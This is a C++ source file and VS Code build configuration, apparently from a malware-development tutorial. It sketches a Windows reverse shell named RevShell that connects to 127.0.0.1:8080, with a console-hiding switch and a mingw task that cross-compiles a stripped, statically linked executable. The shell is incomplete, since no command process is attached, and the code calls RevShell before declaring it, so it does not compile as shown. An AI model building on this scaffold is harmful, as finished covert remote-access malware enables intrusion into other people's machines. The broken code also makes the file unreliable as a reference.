//C++ Headers

#include <winsock2.h>       //Socket Header
#include <windows.h>        //Win API Header
#include <ws2tcpip.h>       //TCP-IP Header
//C Header
#include <stdio.h>          //Input Output Header

//Debug C++ Header
#include <iostream>     //Input Output Debug Header

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

//Main function

int main()
{
    HWND stealth;           //Declare a window handle
    AllocConsole();     //Allocate a new console
    stealth=FindWindowA("ConsoleWindowClass",NULL); //Find the previous Window handler and hide/show the window depending upon the next command
    ShowWindow(stealth,SW_SHOWNORMAL);  //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
    RevShell();
    return 0;
}

void RevShell()
{
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2,2), &wsaver);
    SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(8080);

    if(connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
        std::cout << "[+] Connected. Hit <Enter> to disconnect..." << std::endl;
        std::cin.get();
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}

// tasks.json
{
    "version": "2.0.0",
    "tasks": [
        {
            "label": "Build Code",
            "type": "shell",
            // For windows, uncomment g++ and comment out the linux command
            // "command": "g++",
            // For Linux:
            "command": "i686-w64-mingw32-g++",
            "args": [
                //Compilation Flags and Options
                "-std=c++11", "maldev.cpp", "-o", "maldev.exe", "-s", "-lws2_32", "-Wno-write-strings", "-fno-exceptions", "-fmerge-all-constants", "-static-libstdc++", "-static-libgcc"
            ],
            "group": {
                "kind": "build",
                "isDefault": true
            }
        }
    ]
}
